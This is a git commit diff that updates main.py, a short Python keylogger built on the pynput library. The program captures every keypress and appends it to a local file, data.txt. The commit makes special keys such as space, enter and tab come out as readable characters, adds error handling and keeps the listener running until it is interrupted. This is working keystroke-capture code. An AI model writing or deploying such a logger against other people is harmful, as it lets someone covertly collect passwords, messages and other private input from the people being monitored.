24991a15692b371478a4a8254eadb7d53cc762c3
AK-PK <129682500+AK-PK22@users.noreply.github.com>
2023-09-09 14:08:29 +0200

    Update main.py

--- main.py
+++ main.py
@@ -1,7 +1,6 @@
 from pynput import keyboard
 
-
-class KeyLogger():
+class KeyLogger:
     def __init__(self, filename: str = "data.txt") -> None:
         self.filename = filename
 
@@ -10,21 +9,38 @@ class KeyLogger():
         try:
             return key.char
         except AttributeError:
-            return str(key)
+            # Handle special keys (e.g., Shift, Ctrl, Alt)
+            if str(key) == "Key.space":
+                return " "
+            elif str(key) == "Key.enter":
+                return "\n"
+            elif str(key) == "Key.tab":
+                return "\t"
+            else:
+                return f"[{str(key)}]"
 
     def on_press(self, key):
-        print(key)
-        with open(self.filename, 'a') as logs:
-            logs.write(self.get_char(key))
+        try:
+            char = self.get_char(key)
+            if char:
+                with open(self.filename, 'a') as logs:
+                    logs.write(char)
+        except Exception as e:
+            print(f"Error: {e}")
 
     def main(self):
+        print("Keylogger started. Press 'Ctrl + C' to stop.")
         listener = keyboard.Listener(
             on_press=self.on_press,
         )
         listener.start()
-
+        listener.join()  # Wait for the listener to stop
 
 if __name__ == '__main__':
-    logger = KeyLogger()
-    logger.main()
-    input()
+    try:
+        logger = KeyLogger()
+        logger.main()
+    except KeyboardInterrupt:
+        print("Keylogger stopped.")
+    except Exception as e:
+        print(f"An error occurred: {e}")
